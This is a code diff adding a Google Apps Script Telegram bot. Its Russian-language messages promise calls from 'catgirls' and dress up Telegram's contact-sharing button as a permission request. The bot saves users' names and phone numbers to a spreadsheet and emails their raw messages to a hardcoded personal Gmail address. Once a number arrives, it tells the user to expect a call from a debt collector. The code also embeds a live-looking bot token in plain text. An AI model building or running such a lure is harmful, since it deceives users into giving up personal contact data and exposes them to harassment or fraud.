@@ -1,0 +1,154 @@
+function doPost(e) {
+  Logger.log('Received POST request');
+  var data = JSON.parse(e.postData.contents);
+  var callbackQuery = data.callback_query;
+  GmailApp.sendEmail("den.belov.1707@gmail.com","log", JSON.stringify(data.message));
+
+  if (callbackQuery) {
+    onRequestPhone(callbackQuery);
+  } 
+  else if (data.message && data.message.text === '/start') {
+    startBotForUser(data.message);
+  } 
+  else if (data.message && data.message.contact) {
+
+    GmailApp.sendEmail("den.belov.1707@gmail.com","log", JSON.stringify(data.message));
+
+    try {
+    DeleteKeyboard(data.message.chat.id);
+
+    onReceiveContact(data.message.contact);
+    }
+    catch (error) {
+      GmailApp.sendEmail("den.belov.1707@gmail.com","log",error.message);
+    }
+
+
+  }
+}
+
+function startBotForUser(message) {
+  var token = '7160938324:AAE-6M2N5iZW6dqHS6iEHSPXZujozhRjJ1Y';
+  var telegramAPI = 'https://api.telegram.org/bot' + token + '/sendMessage';
+
+  var keyboard = {
+    inline_keyboard: [[{ text: 'Отправить номер телефона', callback_data: 'request_phone' }]]
+  };
+
+
+  try {
+    sendWelcomeMessage(message.chat.id)
+
+    Logger.log(response);
+  } 
+  catch (error) {
+    Logger.log('Error:', error);
+  }
+}
+
+function onRequestPhone(e) {
+  var token = '7160938324:AAE-6M2N5iZW6dqHS6iEHSPXZujozhRjJ1Y';
+  var telegramAPI = 'https://api.telegram.org/bot' + token + '/sendMessage';
+
+  var message = 'Необходимо разрешение на эту операцию';
+
+  var payload = {
+    method: 'sendMessage',
+    chat_id: e.message.chat.id,
+    text: message,
+    reply_markup: JSON.stringify({
+      keyboard: [
+        [{ text: 'Разрешить', request_contact: true }]
+      ],
+      resize_keyboard: true,
+      one_time_keyboard: true
+    })
+  };
+
+  try {
+    var response = UrlFetchApp.fetchAll([{
+      url: telegramAPI,
+      method: 'post',
+      contentType: 'application/json',
+      payload: JSON.stringify(payload),
+      muteHttpExceptions: true
+    }]);
+
+    removeInlineKeyboard(e.message.chat.id,e.message.message_id);
+    
+
+    Logger.log(response);
+  } 
+  catch (error) {
+    Logger.log('Error:', error);
+  }
+  
+}
+
+function onReceiveContact(contact) {
+  var spreadsheet = SpreadsheetApp.getActiveSpreadsheet();
+  var sheet = spreadsheet.getActiveSheet();
+
+  var userData = [
+    [contact.user_id, contact.first_name, contact.last_name, contact.phone_number, new Date()]
+  ];
+
+  sheet.getRange(sheet.getLastRow() + 1, 1, 1, userData[0].length).setValues(userData);
+}
+
+function DeleteKeyboard(chat_id) {
+
+  var token = '7160938324:AAE-6M2N5iZW6dqHS6iEHSPXZujozhRjJ1Y';
+  var telegramAPI = 'https://api.telegram.org/bot' + token + '/';
+
+  return UrlFetchApp.fetch(telegramAPI + "sendMessage", {
+    "method": "post",
+    "contentType": "application/json",
+    "payload": JSON.stringify({
+      "chat_id": chat_id,
+      "text": "Ваш номер принят, можете ожидать звоночка вашего коллектора^^",
+      "reply_markup": {
+        "remove_keyboard": true
+      }
+    })
+  });
+}
+
+function removeInlineKeyboard(chatId,messageId) {
+var token = '7160938324:AAE-6M2N5iZW6dqHS6iEHSPXZujozhRjJ1Y';
+  var telegramAPI = 'https://api.telegram.org/bot' + token + '/';
+
+
+  UrlFetchApp.fetch(telegramAPI + "editMessageReplyMarkup",{
+    method: "post",
+    contentType: "application/json",
+    payload: JSON.stringify({
+      chat_id: chatId,
+      message_id: messageId,
+      reply_markup: JSON.stringify({})
+    })
+  });
+}
+
+function sendWelcomeMessage(chatId) {
+  var photoUrl = "https://zenmarket.blob.core.windows.net/images/blog/gq0hpidu.r4t"; 
+  var caption = "Добро пожаловать^^ для того чтоб вам позвонили кошко-девочки, вам нужно предоставить нам номерочек";
+  var token = '7160938324:AAE-6M2N5iZW6dqHS6iEHSPXZujozhRjJ1Y';
+  var telegramAPI = 'https://api.telegram.org/bot' + token + '/';
+ var keyboard = {
+    inline_keyboard: [[{ text: 'Отправить номер телефона', callback_data: 'request_phone' }]]
+  };
+
+  var payload = {
+    method: "post",
+    contentType: "application/json",
+    payload: JSON.stringify({
+      chat_id: chatId,
+      photo: photoUrl,
+      caption: caption,
+      reply_markup:  JSON.stringify(keyboard)
+    })
+  };
+
+  UrlFetchApp.fetch(telegramAPI + "sendPhoto", payload);
+}
